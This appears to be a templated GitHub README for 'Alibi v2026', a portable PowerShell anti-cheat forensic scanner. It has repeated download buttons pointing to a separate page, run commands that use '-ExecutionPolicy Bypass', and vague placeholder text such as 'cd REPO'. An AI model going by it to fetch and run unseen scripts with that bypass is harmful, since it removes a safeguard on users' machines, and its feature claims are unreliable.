# Alibi v2026 - Windows forensic anti-cheat scanner 2026

> **Alibi v2026 is a read-only forensic scanner for Windows, created for portable PowerShell-based threat hunting and analyst review of potential cheat indicators without changing the scanned system.**

[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevinmcdiward8299/alibi-windows-scanner-2026?style=flat-square)](https://github.com/kevinmcdiward8299/alibi-windows-scanner-2026)

---

<p align="center">
  <a href="https://kevinmcdiward8299.github.io/alibi-windows-scanner-2026/">
    <img src="https://img.shields.io/badge/Download-Alibi%20Latest-brightgreen?style=for-the-badge" alt="Download Alibi">
  </a>
</p>

> **[Download Alibi v2026](https://kevinmcdiward8299.github.io/alibi-windows-scanner-2026/)**

---

[Download Latest Build](https://kevinmcdiward8299.github.io/alibi-windows-scanner-2026/)

---

## Overview

Alibi provides a Windows-oriented scan for forensic examination, DFIR activity, and threat-hunting situations that require a non-invasive process. It helps operators investigate possible cheat markers, unusual input devices, console-rig capture signs, and vision aimbot traces without requiring a large installed application.

The scanner is portable and works through PowerShell, which supports field deployment, rapid triage, and consistent checks on multiple systems. Findings are available in both plain-text and HTML reports, allowing results to be examined quickly, shared with others, or stored with case records.

---

## What It Checks

- Performs read-only scans on Windows systems
- Supports forensic investigation and threat-hunting procedures
- Runs from a portable, no-install directory
- Uses a PowerShell-centered workflow
- Creates text reports for rapid examination and retention
- Generates HTML reports suitable for sharing
- Searches for cheat indicators and suspicious input devices
- Inspects for console-rig capture indicators and vision aimbot traces

---

## Getting Started

1. Download or clone the repository.
2. Copy the folder to a Windows machine that has PowerShell available.
3. Run the tool from the extracted or cloned directory.

Example:

    git clone https://github.com/kevinmcdiward8299/alibi-windows-scanner-2026.git
    cd REPO
    powershell -ExecutionPolicy Bypass -File .\Alibi.ps1

For a packaged release, extract the archive and run its included PowerShell entry point from that directory.

---

## Running a Scan

Launch Alibi in PowerShell to begin a scan and inspect the resulting reports:

    powershell -ExecutionPolicy Bypass -File .\Alibi.ps1

A normal review process looks like this:

1. Execute the scanner on the Windows system being examined.
2. Wait for the read-only checks to finish.
3. Use the text report for an initial triage pass.
4. Open the HTML report when a more visual overview is useful.
5. Preserve the output with your DFIR notes or case materials.

Since the scanner is portable, it can be moved from one system to another without a conventional installation.

---

## Configuration and Reports

The PowerShell workflow and any files included with the package generally provide the configuration path. When a settings file or script parameters are included, leave them beside the scanner so the portable directory structure continues to work correctly.

Possible local options may look like this:

    # Example placeholder for local script options
    # .\Alibi.ps1 -OutputPath .\reports -ReportFormat html

If your build does not contain a separate configuration file, use the script parameters and report output location to control execution and results.

---

## Requirements

- Windows operating system
- PowerShell support
- Sufficient storage for generated text and HTML reports
- Permission to read the system being scanned
- A terminal environment capable of running PowerShell scripts

---

## Frequently Asked Questions

**Does Alibi require a standard desktop installation?**  
No. It is designed to run portably from an extracted folder or from a PowerShell launch path.

**Which report formats are available?**  
The scanner creates both text and HTML reports for analysis and documentation.

**Is it suitable for DFIR and threat-hunting work?**  
Yes. Its intended uses include forensic scanning, cheat-indicator review, and related threat-hunting tasks.

**How are scanner settings changed?**  
Review the PowerShell script, its available parameters, and any configuration file included in the particular build.

**Why might the scan fail to start?**  
Make sure PowerShell is installed and available, all package files were extracted, and the script is being run from the correct directory.

**How can I update the scanner?**  
Download the newest build from the project download location, then replace the older package files as needed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
